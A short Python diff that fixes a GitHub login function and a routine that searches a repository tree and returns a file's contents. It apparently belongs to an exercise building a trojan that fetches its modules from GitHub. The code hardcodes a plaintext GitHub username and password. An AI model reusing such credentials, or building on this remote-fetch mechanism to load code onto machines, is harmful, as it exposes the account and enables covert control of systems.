@@ -23,7 +23,7 @@ task_queue = Queue.Queue()
 
 def connect_to_github():
     gh = login(username='binbin831',password='msplcb123')
-    repo = gh.repository('binbin831','myFristRepository/chapter7')
+    repo = gh.repository('binbin831','myFristRepository')
     branch = repo.branch('master')
 
     return gh,repo,branch
@@ -31,14 +31,15 @@ def connect_to_github():
 def get_file_contents(filepath):
 
     gh,repo,branch = connect_to_github()
-    tree = branch.commit.commit.tree.recurse()
+    #tree = branch.commit.commit.tree.recurse()
+    tree = branch.commit.commit.tree.to_tree().recurse()
 
     for filename in tree.tree:
 
         if filepath in filename.path:
 
             print "[*]Found file %s" %filepath
-            blob = repo.blob(filename.__json_data['sha'])
+            blob = repo.blob(filename._json_data['sha'])
             return blob.content
 
     return None
